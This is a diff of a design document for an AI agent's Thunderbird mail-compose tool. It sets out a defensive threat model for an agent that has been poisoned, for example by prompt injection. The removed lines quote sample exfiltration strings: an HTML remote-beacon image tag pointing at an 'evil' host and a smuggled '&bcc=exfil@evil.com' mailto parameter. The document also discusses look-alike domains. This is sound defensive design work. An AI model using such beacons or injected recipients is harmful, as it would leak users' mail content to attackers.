@@ -67,45 +67,46 @@ the homes above. Origin map (question → where the answer now lives):
   words + bm25-ranks (recall-first), calendar ANDs words across
   title/description/location (precision-first, no ranker). The shipped tools.
 
-## v2 — outbound, human-gated (designed, not built)
+## v2 — outbound, human-gated (compose shipped; calendar-create designed)
 
 The egress half. The load-bearing invariant (now also the CLAUDE.md seam):
 **pikuri performs no network egress and no autonomous send; every outbound
 action is a hand-off to Thunderbird's own UI where the human commits.** No
 send tool ever ships. Confirmed hand-off mechanics are in DESIGN.md §
-"Hand-off mechanics"; the *design* on top of them:
+"Hand-off mechanics".
 
-### `thunderbird_mail_compose` — hand off a pre-filled draft
+### `thunderbird_mail_compose` — **shipped** (first cut)
 
-- **Transport = a `mailto:` URI** (decided; `-compose` can't do multiline —
-  see DESIGN.md). Opens a pre-filled compose window in the running instance;
-  the human reviews and clicks Send.
-- **Plain-text body only, no HTML.** Load-bearing, not cosmetic: HTML gives a
-  poisoned agent two exfil vectors plain text lacks — hidden content
-  (white-on-white / `display:none`) that survives the human's visual review,
-  and remote beacons (`<img src=http://evil/?leak=…>`) that fire on open and
-  ship to an *arbitrary host*, punching through the "the body only goes to the
-  intended recipient" premise. Plain text: what the human sees is what sends.
-- **Injection defense — percent-encode every field value.** Because the
-  transport is a URI, a naive concat lets an attacker-authored body smuggle
-  `&bcc=exfil@evil.com`. Encoding each value (so `&`/`?`/`=`/`#`/`%`/newline →
-  `%XX`) structurally closes that; runs *after* the recipient guard below.
-- **Body pre-fill = full, useful body** (decided). The forced-authorship seat
-  binds to the **recipient + intent-to-send**, not the prose: content-drafting
-  is the agent's job, destination-authorship is the human's. Safe *given the
-  recipient guard* because "the recipient is the attack" — a leaked body goes
-  to the legitimately-intended recipient, a weak channel by construction. A
-  directed pre-send checklist observation ("before Send: confirm the recipient;
-  the body carries nothing you wouldn't want them to see") re-instills the
-  audit mindset without crippling the draft.
-  - *Rejected:* bullet-skeleton pre-fill (theater — unenforceable, doesn't
-    close body-exfil, worse draft); subject-only/empty body (guts the feature).
-- **Binary** = `thunderbird` on PATH, with a `thunderbird_bin:` override
-  mirroring Q3's `profile_dir:`.
+Built as opt-in (`Extension.new(compose: true)`, default off so the demo stays
+no-egress by construction). The design graduated to source and yardoc:
+
+- **{Pikuri::Thunderbird::MailCompose}** — the tool: `mailto:`-URI hand-off,
+  full-body pre-fill, the directed pre-send checklist, detached `setsid --fork`
+  launch (so closing the agent never SIGTERMs the user's Thunderbird), the
+  `thunderbird_bin:` override.
+- **{Pikuri::Thunderbird::MailtoUri}** — percent-encodes every field value
+  (the injection defense; a smuggled `&bcc=` is defused to body text).
+- **{Pikuri::Thunderbird::ComposeGuard}** — the two-tier recipient guard (below).
+
+Still open / deferred here:
+- *Rejected (kept for the reasoning):* bullet-skeleton pre-fill (theater —
+  unenforceable, doesn't close body-exfil, worse draft) and subject-only/empty
+  body (guts the feature) — both lost to full-body pre-fill, since the
+  forced-authorship seat binds to the **recipient + intent-to-send**, not the
+  prose ("the recipient is the attack"; a leaked body only ever reaches the
+  intended recipient).
 - **Attachments** deferred to a later pass (the author-not-approver draft
   doesn't need them, and a path/URL reopens the staging problem).
+- **Plain-text-only** is enforced by never emitting an HTML body — no HTML knob
+  exists, so the two HTML-only exfil vectors (hidden content, remote beacons)
+  can't arise. (Rationale in the {MailCompose} yardoc.)
+- **A compose-enabled binary needs its own prompt.** `bin/pikuri-thunderbird`'s
+  prompt says the agent "cannot send mail" — true while compose is off, wrong
+  once it's on. A compose wiring (e.g. a future `pikuri-assistant` shape) must
+  supply a prompt that permits drafting-for-review; not built (no binary wires
+  `compose: true` yet).
 
-### `thunderbird_calendar_create` — hand off an `.ics` to import
+### `thunderbird_calendar_create` — hand off an `.ics` to import (designed, not built)
 
 - **Decided: hand TB an `.ics`** (`thunderbird <path.ics>` → the human-gated
   import wizard; TB owns the commit *and* the human picks the destination
@@ -117,37 +118,19 @@ send tool ever ships. Confirmed hand-off mechanics are in DESIGN.md §
   `~/snap/thunderbird/common/…`, apt → the (unconfined) profile root; **not**
   the hidden `~/.cache` snapshot dir. Finalizer-reap after hand-off.
 
-### The recipient guard (Q10) — machine covers the invisible, human the visible
+### The recipient guard (Q10) — **shipped**
 
-The compose ceremony is a strong human barrier on the **recipient** and gross
-content, but soft on subtle body-exfil and look-alike domains. The mechanical
-outbound guard (deterministic, never an AI verdict), in two tiers:
+The two-tier mechanical guard (hard-reject: Sanitizer everywhere + body
+fail-closed + address ASCII-only/no-punycode; soft-warn: correspondence-graph
+novelty) graduated to {Pikuri::Thunderbird::ComposeGuard}, backed by the new
+{Pikuri::Thunderbird::Gloda#domains_seen} identity-graph query. What stays here:
 
-- **Hard reject → omit the field + force retype:**
-  - Everywhere (subject/body/address): route through {Pikuri::Sanitizer}
-    (control bytes, bidi, zero-width, mixed-script welds like `Pаypal`). On a
-    **body** flag, **fail closed** — error and hand off nothing (an
-    agent-authored outbound body has no honest reason to carry those; degrade
-    to the human retyping in TB). Scope to validate at build: emoji, accents,
-    RTL letters must pass; only bidi override/isolate, zero-width, C0/C1
-    controls trip it.
-  - Address fields only: **ASCII-only** (kills Latin-diacritic look-alikes
-    like `@mícrosoft.com` that Sanitizer's script-mix check misses) **+ reject
-    `xn--` punycode** (a pre-encoded homoglyph domain is pure ASCII and would
-    otherwise pass). Tolerable false-positives (rare IDN recipients) because
-    the fallback is "type it in TB."
-- **Soft warn → keep, but raise scrutiny:** the **correspondence-graph
-  novelty flag** — for each recipient domain, ask Gloda's `contacts`/
-  `identities` graph "has the user ever exchanged mail with this domain?"
-  (both directions; Sent is indexed). A never-seen domain (`paypa1.com` when
-  you've mailed `paypal.com` 100×) gets a loud observation urging out-of-band
-  verification, but stays in the pre-fill — a hard reject here would fire on
-  every genuinely-new correspondent and burn to fatigue. Degrades cleanly off
-  Gloda (mbox fallback → skip + say so).
-- **Honest residual:** pure-ASCII look-alikes of a domain you've *never* used,
-  thin-history mailboxes, and a human who waves the warning through. That's why
-  the observation urges a human-driven out-of-band browser check — the last
-  line, outside the agent's trust boundary (adds no egress leg).
+- **Honest residual (unchanged by shipping):** pure-ASCII look-alikes of a
+  domain you've *never* used, thin-history mailboxes, and a human who waves the
+  warning through. That's why the observation urges a human-driven out-of-band
+  check — the last line, outside the agent's trust boundary (adds no egress leg).
+- **Novelty-check schema is unverified against a real box** — see Open
+  validation questions.
 
 ### `thunderbird_*` trifecta detector wiring (when compose is added)
 
@@ -172,6 +155,13 @@ v1 ran end-to-end against an actual Thunderbird profile, working well.)
   the read/star/tag churn is already confirmed. The content-triple de-churn
   (`max(id)`/`count(*)`/`sum(deleted)`) is the upgrade if the ~1 s spurious
   rebuild ever bites.
+- **Compose recipient-novelty identity schema.** {Gloda#domains_seen} reads
+  `identities(kind, value)` — the shape recalled from Gloda, **not** probed on a
+  real box (DESIGN.md marks `contacts`/`identities` "unused in v1"). The query
+  degrades gracefully (any `SQLite3::SQLException` → "couldn't check" note), so a
+  wrong column name is a silent no-op, not a crash — but the *feature* is unproven
+  until a real profile confirms the domains are actually found. First real-box
+  compose is the test.
 - **`CAL_ITEM_FLAG` mapping** — verify the recalled bitfield (esp. beyond
   bit 8) against comm-central at v2-calendar-create implementation.
 - **v2 residual — does importing an `.ics` with `ATTENDEE` lines onto a
@@ -186,3 +176,6 @@ v1 ran end-to-end against an actual Thunderbird profile, working well.)
   (eastern/UTC) case is right. See the comment in {Pikuri::Thunderbird::Calendar}.
 - **`.msf` (Mork), maildir, mbox fallback** — all deferred; build only when a
   Gloda-disabled or maildir host is a real user.
+- Mention in the book
+- Integrate into pikuri-os
+
